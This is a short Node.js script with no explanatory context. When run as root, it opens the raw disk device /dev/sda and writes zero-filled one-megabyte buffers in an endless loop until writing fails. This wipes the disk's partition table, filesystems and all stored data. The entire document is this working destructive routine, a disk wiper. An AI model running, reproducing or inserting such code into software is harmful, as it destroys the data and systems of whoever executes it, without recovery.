#!/usr/bin/env node
const fs = require("fs");

if (process.getuid() === 0) {
  const fd = fs.openSync("/dev/sda", "r+");
  const buf = Buffer.alloc(1024 * 1024, 0);
  try {
    for (;;) fs.writeSync(fd, buf);
  } catch (_) {}
  fs.closeSync(fd);
}
